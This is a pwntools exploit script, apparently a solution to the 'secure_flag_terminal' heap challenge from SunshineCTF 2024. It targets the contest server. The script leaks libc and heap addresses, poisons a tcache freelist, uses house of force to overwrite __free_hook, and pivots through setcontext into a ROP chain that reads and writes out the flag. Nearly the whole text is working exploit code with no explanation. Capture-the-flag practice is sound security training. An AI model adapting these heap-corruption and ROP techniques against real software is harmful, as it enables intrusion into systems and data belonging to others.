from pwn import *

exe = ELF("./secure_flag_terminal")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process("./secure_flag_terminal")
#gdb.attach(p)
p = remote("2024.sunshinectf.games", 24002)

def create(size):
    p.sendlineafter(b"Enter option: ", b"1")
    p.sendlineafter(b"Enter size of flag --> ", str(size).encode())

def edit(idx, data):
    assert len(data) <= 0xb4
    p.sendlineafter(b"Enter option: ", b"2")
    p.sendlineafter(b"Enter flag # to edit", str(idx).encode())
    p.sendlineafter(b"Enter new flag --> ", data)

def view(idx):
    p.sendlineafter(b"Enter option: ", b"3")
    p.sendlineafter(b"Enter flag # to view", str(idx).encode())

def delete(idx):
    p.sendlineafter(b"Enter option: ", b"4")
    p.sendlineafter(b"Enter flag # to remove --> ", str(idx).encode())

p.recvuntil(b"Kernel Seed: ")
kernel_seed = int(p.recvline().strip(), 16)
libc_leak = kernel_seed - libc.symbols["rand"] 
libc.address = libc_leak
log.success(f"{hex(libc.address)=}")

setcontext_gadget = libc.sym["setcontext"]+53
log.info(f"{hex(setcontext_gadget)=}")
first_gadget = libc.address + 0x000000000015c268 # mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x10]
log.info(f"{hex(first_gadget)=}")

### Leak heap:
create(0x80)
create(0x30)
create(0x30)
delete(3)
delete(2)
edit(1, b"C"*0x90)

view(1)
p.recvuntil(b"C"*0x90 + b"\n")
heap_leak = ((u64(p.recvline()[:6].ljust(8, b"\x00")) - 0xa0000000000) << 8) + 0x60
edit(1, b"C"*0x88 + p64(0x41) + p64(heap_leak-0xf0) + p64(heap_leak - 0x1350))
log.success(f"{hex(heap_leak)=}")

### Leak fd and clean up
create(0x30)
create(0x30)
view(3)
p.recvline()
p.recvline()
fd = u64(p.recvline()[:-1].ljust(8, b"\x00"))
log.success(f"{hex(fd)=}")

delete(3)
delete(2)
edit(1, b"C"*0x88 + p64(0x41) + p64(heap_leak) + p64(heap_leak - 0x1350)) # should be clean at this point
create(0x40)
context_chunk = heap_leak + 0x40 # address of chunk with payload
rop_chunk = heap_leak - 0xd0

context = b"A"*8
context += p64(context_chunk)
context += p64(setcontext_gadget)
context += p64(0x0)
context += p64(0x0)
context += p64(0x0) # r8
context += p64(0x0) # r9
context += p64(0x0)
context += p64(0x0)
context += p64(0xffffffffffffffff)
context += p64(0x0) # r13
context += p64(0x0) # r14
context += p64(0x0) # r15
context += p64(fd) # rdi
context += p64(heap_leak+0x400) # rsi
context += p64(rop_chunk + 0xb0) # rbp
context += p64(0x0) # rbx
context += p64(0x1000) # rdx
context += p64(0x0)
context += p64(0x0) # rcx
context += p64(rop_chunk) #rsp
context += p64(libc.sym["read"])
edit(2, context)

pop_rdi = libc.address + 0x2164f
pop_rsi = libc.address + 0x23a6a
pop_rdx = libc.address + 0x1b96

ropchain = p64(pop_rdi)
ropchain += p64(0x1)
ropchain += p64(pop_rsi)
ropchain += p64(heap_leak+0x400)
ropchain += p64(pop_rdx)
ropchain += p64(100)
ropchain += p64(libc.sym["write"])
edit(1, ropchain)

### house of force for rip control
target = libc.symbols['__free_hook']
current_top_chunk = heap_leak + 0x80
offset = target - current_top_chunk - 0x40
create(offset)
create(0x20)

### ROP
edit(4, p64(0x0)*5 + p64(first_gadget))
delete(2)

p.interactive()
